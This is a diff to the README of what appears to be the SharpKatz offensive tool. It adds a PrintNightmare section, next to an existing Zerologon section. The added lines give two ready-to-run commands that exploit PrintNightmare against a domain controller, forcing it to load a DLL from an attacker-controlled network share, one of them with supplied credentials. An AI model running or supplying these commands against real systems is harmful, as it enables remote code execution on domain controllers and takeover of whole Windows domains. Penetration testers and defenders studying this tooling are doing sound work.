@@ -102,6 +102,14 @@ Perform Zerologon attack and export the entire dataset from AD to a file created
 <br>
 Note: Do not use zerologon in a production environment or at least plan for recovery actions which are detailed [here](https://github.com/dirkjanm/CVE-2020-1472) 
 
+### PrintNightmare CVE-2021-1675 - CVE-2021-34527
+
+```SharpKatz.exe --Command printnightmare --DomainController dc --Library \\\\mycontrolled\\share\\fun.dll```
+Perform PrintNightmare attack <br>
+<br>
+```SharpKatz.exe --Command printnightmare --DomainController dc --Library \\\\mycontrolled\\share\\fun.dll --AuthUser user --AuthPassword password --AuthDomain dom```
+Perform PrintNightmare attack with provided credentials<br>
+<br>
 
 ## Credits
 
